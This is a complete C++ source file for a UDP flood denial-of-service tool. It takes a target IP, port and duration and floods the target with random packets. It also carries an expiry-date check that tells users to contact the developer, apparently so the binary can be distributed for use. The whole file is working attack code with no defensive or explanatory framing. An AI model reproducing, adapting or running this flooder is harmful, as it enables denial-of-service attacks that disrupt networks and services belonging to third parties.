#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>

#define PACKET_SIZE 15000  // Size of each packet to be sent
#define PAYLOAD_SIZE 1400  // UDP payload size optimized for performance

// Expiry date constants (set your desired date)
const int EXPIRY_DAY = 20;
const int EXPIRY_MONTH = 12;  // November
const int EXPIRY_YEAR = 2024;

// Function to generate a random payload for UDP packets
void generate_payload(char *buffer, size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// Function to check if the binary has expired
bool is_binary_expired() {
    time_t now = time(nullptr);
    struct tm *current_time = localtime(&now);

    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH &&
         current_time->tm_mday > EXPIRY_DAY)) {
        return true;
    }
    return false;
}

// Function to perform a powerful UDP flood
void udp_attack(const char *ip, int port, int attack_time) {
    sockaddr_in server_addr{};
    char buffer[PAYLOAD_SIZE];

    // Create a UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        std::cerr << "Error: Unable to create socket. " << strerror(errno) << std::endl;
        return;
    }

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        std::cerr << "Error: Invalid IP address - " << ip << std::endl;
        close(sock);
        return;
    }

    // Fill the buffer with random data
    generate_payload(buffer, PAYLOAD_SIZE);

    std::cout << "Launching single-threaded UDP flood attack..." << std::endl;

    // Flood loop
    time_t start_time = time(nullptr);
    while (time(nullptr) - start_time < attack_time) {
        ssize_t sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent < 0) {
            std::cerr << "Error: Failed to send packet. " << strerror(errno) << std::endl;
        }
    }

    close(sock);
    std::cout << "Attack completed." << std::endl;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time>" << std::endl;
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);

    // Check if the binary has expired
    if (is_binary_expired()) {
        std::cerr << "Error: This binary has expired. Please contact the developer." << std::endl;
        return EXIT_FAILURE;
    }

    // Perform the attack
    udp_attack(ip, port, duration);

    return EXIT_SUCCESS;
}